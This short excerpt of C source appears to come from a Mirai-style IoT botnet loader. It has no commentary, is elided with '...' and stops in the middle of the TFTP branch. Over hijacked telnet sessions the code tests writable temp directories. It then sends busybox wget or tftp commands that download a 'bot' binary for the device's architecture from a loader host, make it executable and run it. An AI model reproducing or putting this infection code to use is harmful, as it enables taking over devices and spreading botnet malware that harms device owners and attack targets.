            ...
            while(TRUE)
            {
                ...
                switch(conn->state_telnet)
                {
                    ...
                    case TELNET_READ_WRITEABLE:
                        for(j = 0; j < 13; j++)
                        util_sockprintf(conn->fd, ">%s.wellnope && cd %s\r\n", tmp_dirs[j], tmp_dirs[j]);
                        ...
                        if(consumed)
                        {
                            ...
                            switch(conn->info.upload_method)
                            {
                                ...
                                case UPLOAD_WGET:
                                    ...
                                    conn->timeout = 120;
                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:80/bot.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    wrker->srv->wget_host_ip, conn->info.arch);
                                    #ifdef DEBUG
                                        printf("wget\n");
                                    #endif
                                    break;
				                case UPLOAD_TFTP:
                                    ...
                                    conn->timeout = 120;
                                    util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r bot.%s %s; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
